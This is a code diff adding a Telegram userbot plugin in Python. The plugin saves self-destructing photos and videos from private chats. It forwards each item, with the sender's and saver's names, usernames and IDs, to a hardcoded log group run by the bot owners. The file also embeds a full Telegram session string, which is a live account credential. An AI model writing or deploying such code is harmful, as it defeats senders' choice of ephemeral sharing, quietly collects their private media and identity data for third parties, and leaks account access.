@@ -1,0 +1,257 @@
+
+import asyncio
+import os
+import pyrogram.handlers
+from pyrogram import Client, filters
+from pyrogram.types import (
+    Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
+)
+from SHASHA_DRUGZ import app
+from config import API_ID, API_HASH
+
+# ==========================================
+#  🔧 CONFIGURATION
+# ==========================================
+
+LOG_GROUP_ID = -1003672161546
+
+# Only these User IDs can use the Delete button in Log Group
+OWNERS_LIST = [
+    6773435708, 
+    8399160924,
+    # Add more IDs here
+]
+
+USER_STRINGS = [
+    # User 1
+    "BQGhmW8Aspvj4KU0dhP2AcY3EFe8rdSNHAsFW4ZitgGwxy4EPZBBwtqB_7Al5W-tQqzxFGPV2qwMLY6Sktmtgu9A2XBhSeD2gZL8_Zs0W2794MW56zEMCy2p95tkcIweEq8RSG0DmJhYjDBWVorePka_aQ0iuxdlnSMLS-dHYtAkhevdniX2_KsF9F-fLDtoxSCD8cg7H2YjAE9xDnClNfB2ugFyBgl-nzAaTIK3VT0vM9-epv-AU4vJW2exc71QlZyHFlgTkjEJcM9cD2IMmvvuX4NxWUGglCDImekN-TeLKVwklr18vTyfvmb_Npn4mHz0UJsOu5l1LnZBRrxzr4PUFsvnugAAAAGTum08AA", #GhostBat
+    # Add User 2, etc.
+]
+
+# Triggers
+command_filter = filters.command(
+    ["mm", "ait", "am", "👀", "beat", "Beat", "wait"], 
+    prefixes=["h", "w", "H", "W", "👀", "Heart", "heart", "", ".", "/"]
+)
+
+# ==========================================
+#  1. DELETE BUTTON HANDLER (LOG GROUP SIDE)
+# ==========================================
+@app.on_callback_query(filters.regex(r"^delsave_"))
+async def delete_user_copy_callback(_, query: CallbackQuery):
+    # 1. Security Check: Only OWNERS can click
+    if query.from_user.id not in OWNERS_LIST:
+        return await query.answer("❌ Only Bot Owners can use this!", show_alert=True)
+
+    # 2. Parse Data: delsave_{user_id}_{message_id}
+    try:
+        data = query.data.split("_")
+        target_user_id = int(data[1])
+        target_msg_id = int(data[2])
+
+        # 3. Delete the message in the User's Private Chat
+        await app.delete_messages(chat_id=target_user_id, message_ids=target_msg_id)
+        
+        # 4. Update the button in Log Group to show it's done
+        await query.answer("✅ Deleted from User's Saved Messages!", show_alert=True)
+        await query.message.edit_reply_markup(
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ User Copy Deleted", callback_data="none")]])
+        )
+        
+    except Exception as e:
+        await query.answer(f"❌ Failed: Message might already be deleted.", show_alert=True)
+        # Still update button to indicate attempted deletion
+        await query.message.edit_reply_markup(
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⚠️ Already Deleted", callback_data="none")]])
+        )
+
+# ==========================================
+#  2. HANDLER LOGIC
+# ==========================================
+async def self_media_handler(client: Client, message: Message):
+    location = None
+    try:
+        replied = message.reply_to_message
+        if not replied:
+            return
+        
+        # Check for Media (Photo or Video)
+        if not (replied.photo or replied.video):
+            return
+            
+        # Notify User (Userbot side)
+        try:
+            status = await message.edit_text("<b>⚡ Processing...</b>")
+        except:
+            status = message
+
+        # --- INFO GATHERING ---
+
+        # 1. Sender Info
+        if replied.from_user:
+            sender_mention = replied.from_user.mention
+            sender_username = f"@{replied.from_user.username}" if replied.from_user.username else "None"
+            sender_id = replied.from_user.id
+        else:
+            sender_mention = "Hidden User"
+            sender_username = "None"
+            sender_id = "Unknown"
+
+        # 2. Saver Info (The one running the command)
+        saver_mention = message.from_user.mention
+        saver_username = f"@{message.from_user.username}" if message.from_user.username else "None"
+        saver_id = message.from_user.id
+
+        # 3. Source Determination
+        # If chat ID matches User ID, it's Saved Messages
+        if message.chat.id == message.from_user.id:
+            source_link = "Saved Messages"
+        else:
+            # If it's a private chat with someone else, get their mention or name
+            if message.chat.type == pyrogram.enums.ChatType.PRIVATE:
+                 # Use chat title/first_name or fallback
+                 source_link = message.chat.first_name or "Private Chat"
+            else:
+                 source_link = message.chat.title or "Group"
+
+        # --- CAPTION GENERATION ---
+        caption = (
+            f"<blockquote><b>🔥 Self-Destruct Saved!</b>\n</blockquote>"
+            f"<blockquote><b>Sender Info:</b>\n"
+            f"• Sender Name: {sender_mention}\n"
+            f"• Username: {sender_username}\n"
+            f"• UserID: <code>{sender_id}</code>\n</blockquote>"
+            f"<blockquote><b>🕵️ Saver Info:</b>\n"
+            f"• Name: {saver_mention}\n"
+            f"• Username: {saver_username}\n"
+            f"• ID: <code>{saver_id}</code>\n\n"
+            f"<b>📍 Source:</b> {source_link}</blockquote>"
+        )
+
+        # 1. Download Media locally
+        location = await client.download_media(replied)
+        
+        if not location:
+            await status.edit_text("❌ Failed to download media.")
+            return
+
+        # 2. Bot uploads to LOG GROUP first (To get File ID)
+        log_msg = None
+        try:
+            if replied.photo:
+                log_msg = await app.send_photo(LOG_GROUP_ID, photo=location, caption=caption)
+            elif replied.video:
+                log_msg = await app.send_video(LOG_GROUP_ID, video=location, caption=caption)
+        except Exception as e:
+            print(f"Log Group Upload Failed: {e}")
+
+        # 3. Bot sends to USER PM (No Buttons) using File ID
+        pm_msg = None
+        sent_via_bot = False
+        
+        # Try sending via BOT first
+        if log_msg:
+            try:
+                # Reuse File ID to save bandwidth
+                file_id = log_msg.photo.file_id if log_msg.photo else log_msg.video.file_id
+                
+                if replied.photo:
+                    pm_msg = await app.send_photo(saver_id, photo=file_id, caption=caption)
+                elif replied.video:
+                    pm_msg = await app.send_video(saver_id, video=file_id, caption=caption)
+                sent_via_bot = True
+            except Exception as e:
+                print(f"Failed to send to User PM via Bot: {e}")
+
+        # 4. FALLBACK: Userbot saves to "Saved Messages" if Bot fails
+        # This fixes the issue where it "doesn't save" if the user hasn't started the bot
+        if not sent_via_bot:
+            try:
+                if replied.photo:
+                    await client.send_photo("me", photo=location, caption=caption)
+                elif replied.video:
+                    await client.send_video("me", video=location, caption=caption)
+                # Note: We can't add the "Delete" button if the Userbot sends it, 
+                # because Userbots can't use callback buttons easily for themselves.
+            except Exception as e:
+                print(f"Userbot Fallback Failed: {e}")
+                await status.edit_text("❌ Failed to save media.")
+
+        # 5. ADD BUTTON TO LOG GROUP MESSAGE
+        # Only if we successfully sent the PM via the Bot (so we have a message ID to delete later)
+        if log_msg and pm_msg:
+            delete_btn = InlineKeyboardMarkup([
+                [InlineKeyboardButton("🗑️ Delete User Copy", callback_data=f"delsave_{saver_id}_{pm_msg.id}")]
+            ])
+            try:
+                await log_msg.edit_reply_markup(reply_markup=delete_btn)
+            except Exception as e:
+                print(f"Failed to add button to log: {e}")
+
+        # Cleanup
+        try:
+            await status.delete()
+        except:
+            pass
+            
+        if location and os.path.exists(location):
+            os.remove(location)
+            
+    except Exception as e:
+        print(f"Error in self_media_handler: {e}")
+        # Cleanup if error
+        if 'location' in locals() and location and os.path.exists(location):
+            os.remove(location)
+
+# ==========================================
+#  MULTI-CLIENT LAUNCHER
+# ==========================================
+
+_ACTIVE_USERBOTS = []
+
+async def start_user_client(session_str, index):
+    if not session_str:
+        return None
+    try:
+        user_bot = Client(
+            name=f"SelfDestruct_User_{index}",
+            api_id=API_ID,
+            api_hash=API_HASH,
+            session_string=session_str,
+            in_memory=True, # Keeps session in RAM, good for multiple clients
+        )
+        
+        # Start the client
+        await user_bot.start()
+        
+        # Register the handler
+        user_bot.add_handler(
+            pyrogram.handlers.MessageHandler(
+                self_media_handler,
+                filters.private & filters.me & command_filter
+            )
+        )
+        
+        # Get user info for cleaner logging
+        me = await user_bot.get_me()
+        print(f"✅ [SelfDestruct] User {index} ({me.first_name}) Connected!")
+        return user_bot
+
+    except Exception as e:
+        print(f"❌ [SelfDestruct] Failed to connect User {index}: {e}")
+        return None
+
+async def init_clients():
+    if not USER_STRINGS:
+        return
+    tasks = []
+    for idx, session in enumerate(USER_STRINGS):
+        if session:
+            tasks.append(start_user_client(session, idx + 1))
+    
+    clients = await asyncio.gather(*tasks)
+    global _ACTIVE_USERBOTS
+    _ACTIVE_USERBOTS = [c for c in clients if c is not None]
+
+if USER_STRINGS:
+    asyncio.create_task(init_clients())
